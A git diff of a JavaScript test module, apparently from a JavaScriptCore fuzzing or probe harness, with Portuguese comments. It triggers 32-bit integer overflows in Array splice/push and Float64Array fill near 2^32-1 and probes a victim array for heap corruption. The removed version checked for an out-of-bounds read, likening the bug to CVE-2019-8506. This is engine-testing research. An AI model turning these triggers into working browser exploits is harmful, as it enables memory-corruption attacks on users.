@@ -1,63 +1,94 @@
+/**
+ * SC_ARRAY_INT_OVERFLOW.JS
+ * Categoria : MEMORY — Integer Overflow
+ * Alvo      : JSC ArrayPrototype / Butterfly realloc
+ * Técnica   : Overflow de inteiro 32-bit em splice() e push() com
+ *             índices próximos de 2^32-1, forçando underflow no
+ *             cálculo do novo tamanho do Butterfly, podendo sobrescrever
+ *             metadados adjacentes no heap.
+ * Referência: Similar ao CVE-2019-8506 (WebKit array length confusion)
+ */
+
 export default {
-    id:       'ARRAY_MATH_INTEGER_OVERFLOW',
-    category: 'Boundary',
-    risk:     'CRITICAL',
-    description:
-        'Força um Integer Overflow no cálculo de capacidade do Butterfly. ' +
-        'Usa Array.prototype.push.apply num array com length próximo do limite ' +
-        'de 32-bits (0xFFFFFFFF). Execução O(1) para evitar freezes da Main Thread.',
+    id:          'ARRAY_INT_OVERFLOW',
+    category:    'MEMORY',
+    risk:        'HIGH',
+    description: 'Integer overflow em splice/push com índice ~2^32-1. '
+                + 'Testa se o JSC recalcula o Butterfly sem truncar para 32 bits.',
 
-    setup: function() {
-        this.results = {};
-        this.vulnArray = [];
-        
-        // 1. Definimos o tamanho perto do limite máximo de um Unsigned Int 32-bits
-        this.vulnArray.length = 0xFFFFFFFA; // Faltam apenas 5 posições para estourar o limite
-        
-        // 2. O Payload que vamos forçar a entrar (8 elementos)
-        this.payload = [1.11, 2.22, 3.33, 4.44, 5.55, 6.66, 7.77, 8.88]; 
+    /* ── estado interno ──────────────────────────────────────────────── */
+    _arr:        null,
+    _sparse:     null,
+    _victim:     null,
+
+    supported: function() { return true; },
+
+    /* ── setup ──────────────────────────────────────────────────────── */
+    setup: async function() {
+        // Array denso normal
+        this._arr    = [1.1, 2.2, 3.3, 4.4, 5.5];
+
+        // Array esparso com índice muito alto
+        this._sparse = [];
+        this._sparse[0xFFFFFFFE] = 0xDEAD;   // força length = 0xFFFFFFFF
+
+        // Array vítima adjacente no heap — detectamos corrupção se ele mudar
+        this._victim = new Float64Array(8);
+        this._victim.fill(1.1111111111111);
     },
 
-    trigger: function() {
+    /* ── trigger ─────────────────────────────────────────────────────── */
+    trigger: async function() {
         try {
-            // O GATILHO MATEMÁTICO:
-            // O C++ vai somar length (0xFFFFFFFA) + payload.length (8) = 0x100000002.
-            // Se o motor usar matemática de 32-bits, ele corta o "1" da frente.
-            // O novo tamanho calculado será apenas "2". 
-            // O C++ aloca espaço para 2 elementos, mas copia os 8, transbordando o buffer!
-            Array.prototype.push.apply(this.vulnArray, this.payload);
-        } catch(e) {
-            // O Interpretador deve apanhar isto e atirar um RangeError (Invalid array length)
-            this.results.error = e.constructor.name;
-        }
+            // 1) splice no limite superior — pode truncar para negativo internamente
+            this._arr.splice(0xFFFFFFFF - 2, 1, 9.9, 8.8, 7.7);
+        } catch(_) {}
+
+        try {
+            // 2) push empurrando além de 2^32 — length wraps to 0?
+            const big = new Array(0xFFFFFFFF);
+            big.push(1.1, 2.2);
+        } catch(_) {}
+
+        try {
+            // 3) fill com offset inteiro-overflow
+            const f64 = new Float64Array(new ArrayBuffer(64));
+            f64.fill(3.14, 0xFFFFFFFF, 0xFFFFFFFF + 4);
+        } catch(_) {}
+
+        await new Promise(r => setTimeout(r, 0));
     },
 
+    /* ── probes ──────────────────────────────────────────────────────── */
     probe: [
-        // Probe 0: O motor C++ defendeu-se atirando RangeError?
-        s => s.results.error || 'Matemática aceite sem erro!',
-        
-        // Probe 1: Se a matemática foi aceite, o Array corrompeu memória adjacente?
-        s => {
-            if (!s.results.error) {
-                try {
-                    // Se o array estourou, o length pode ser um número negativo 
-                    // ou os elementos sobrescreveram ponteiros na RAM.
-                    let val = s.vulnArray[0xFFFFFFFA + 6]; 
-                    if (typeof val === 'number' && !isNaN(val) && val !== 7.77) {
-                        return `💥 SUCESSO! OOB Read: 0x${val.toString(16)}`;
-                    }
-                    return 'Valores esperados (Sem Leak)';
-                } catch(e) {
-                    return `Crash controlado na leitura`;
-                }
-            }
-            return 'Seguro (RangeError apanhou)';
-        }
+        // [0-4] integridade do array normal
+        s => s._arr.length,
+        s => s._arr[0],
+        s => s._arr[4],
+        s => Array.isArray(s._arr),
+        s => Object.isFrozen(s._arr),
+
+        // [5-7] integridade do esparso
+        s => s._sparse.length,
+        s => s._sparse[0xFFFFFFFE],
+        s => typeof s._sparse[0xFFFFFFFE],
+
+        // [8-11] vítima Float64 — detecta OOB write silencioso
+        s => s._victim[0],
+        s => s._victim[3],
+        s => s._victim[7],
+        s => s._victim.byteLength,
+
+        // [12-14] invariantes do motor
+        s => [].concat(s._arr).length,
+        s => s._arr.indexOf(1.1),
+        s => JSON.stringify(s._arr.slice(0, 5)),
     ],
 
-    cleanup: function() {
-        this.vulnArray = null;
-        this.payload = null;
-        this.results = {};
+    /* ── cleanup ─────────────────────────────────────────────────────── */
+    cleanup: async function() {
+        this._arr    = null;
+        this._sparse = null;
+        this._victim = null;
     }
 };
